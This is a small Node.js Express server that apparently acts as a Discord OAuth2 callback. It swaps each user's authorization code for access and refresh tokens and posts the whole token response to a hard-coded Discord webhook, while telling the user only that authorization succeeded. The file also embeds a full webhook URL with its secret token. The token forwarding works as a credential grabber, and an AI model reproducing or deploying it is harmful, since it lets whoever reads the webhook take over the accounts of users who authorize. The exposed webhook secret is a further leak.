const express = require('express');
const axios = require('axios');
const app = express();

// Render ortamı için değişkenler
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const REDIRECT_URI = 'https://discord-bot-auth.onrender.com/callback';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1525719129133285476/ua1MXdX7uWJ7lK6Dbq3GKoRzxELGKoz3NJDL66fgUYkS1RzliEwEtmLsrPbuw4SdVM7v';

// Callback endpoint'i
app.get('/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.status(400).send('No code provided');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI
        }).toString(), { 
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' } 
        });

        await axios.post(WEBHOOK_URL, {
            content: `**New Auth Data:**\n\`\`\`json\n${JSON.stringify(tokenResponse.data, null, 2)}\n\`\`\``
        });

        res.send('Authorization successful.');
    } catch (error) {
        console.error(error.response?.data || error.message);
        res.status(500).send('Authentication failed.');
    }
});

// Render'ın dinamik portunu kullanması için güncelleme
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));